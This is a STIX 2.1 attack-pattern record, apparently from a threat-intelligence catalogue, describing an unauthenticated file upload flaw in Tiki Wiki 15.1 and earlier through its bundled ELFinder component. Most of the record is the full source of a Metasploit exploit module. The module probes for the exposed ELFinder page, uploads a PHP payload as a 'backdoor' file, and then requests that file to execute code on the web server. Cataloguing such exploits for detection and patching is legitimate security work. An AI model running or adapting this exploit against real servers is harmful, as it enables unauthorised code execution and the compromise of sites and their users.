{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9808efb-5639-42c6-becc-c4bfc8da359f",
    "created": "2024-08-14T17:13:04.4344Z",
    "modified": "2024-08-14T17:13:04.434404Z",
    "name": "Tiki Wiki Unauthenticated File Upload Vulnerability",
    "description": " This module exploits a file upload vulnerability in Tiki Wiki <= 15.1 which could be abused to allow unauthenticated users to execute arbitrary code under the context of the web server user.  The issue comes with one of the 3rd party components. Name of that component is ELFinder -version 2.0-. This component comes with default example page which demonstrates file operations such as upload, remove, rename, create directory etc. Default configuration does not force validations such as file extension, content-type etc. Thus, unauthenticated user can upload PHP file.  The exploit has been tested on Debian 8.x 64-bit and Tiki Wiki 15.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/tikiwiki_upload_exec.rb",
            "external_id": "tikiwiki_upload_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.mehmetince.net/exploit/tiki-wiki-unauthenticated-file-upload-vulnerability"
        },
        {
            "source_name": "reference",
            "url": "https://tiki.org/article434-Security-update-Tiki-15-2-Tiki-14-4-and-Tiki-12-9-released"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Tiki Wiki Unauthenticated File Upload Vulnerability',\n      'Description'    => %q{\n          This module exploits a file upload vulnerability in Tiki Wiki <= 15.1\n        which could be abused to allow unauthenticated users to execute arbitrary code\n        under the context of the web server user.\n\n        The issue comes with one of the 3rd party components. Name of that component is\n        ELFinder -version 2.0-. This component comes with default example page which\n        demonstrates file operations such as upload, remove, rename, create directory etc.\n        Default configuration does not force validations such as file extension, content-type etc.\n        Thus, unauthenticated user can upload PHP file.\n\n        The exploit has been tested on Debian 8.x 64-bit and Tiki Wiki 15.1.\n      },\n      'Author'         =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>' # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://www.mehmetince.net/exploit/tiki-wiki-unauthenticated-file-upload-vulnerability' ],\n          [ 'URL', 'https://tiki.org/article434-Security-update-Tiki-15-2-Tiki-14-4-and-Tiki-12-9-released' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        => [ ['Automatic', {}] ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2016-07-11'\n      ))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [ true, \"Installed path of Tiki Wiki\", \"/tiki/\"])\n        ])\n  end\n\n  def check\n    url = normalize_uri(target_uri.path, \"vendor_extra/elfinder/elfinder.html\")\n    res = send_request_cgi(\n        'method'  => 'GET',\n        'uri'     =>  url\n    )\n\n    if res && res.code == 200\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    filename = rand_text_alpha(8 + rand(4)) + '.php'\n    register_file_for_cleanup(filename)\n\n    data = Rex::MIME::Message.new\n    data.add_part('upload', nil, nil, 'form-data; name=\"cmd\"')\n    data.add_part('l1_Lw', nil, nil, 'form-data; name=\"target\"')\n    data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"upload[]\\\"; filename=\\\"#{filename}\\\"\")\n\n    print_status(\"Uploading backdoor file: #{filename}\")\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"vendor_extra/elfinder/php/connector.minimal.php\"),\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => data.to_s\n     })\n\n    if res && res.code == 200\n      print_good(\"Backdoor successfully created.\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Error on uploading file\")\n    end\n\n    print_status(\"Trigging the exploit...\")\n    send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => normalize_uri(target_uri.path, \"vendor_extra/elfinder/files/\" + filename)\n     }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-11",
    "x_mitre_platforms": [
        "['php']"
    ]
}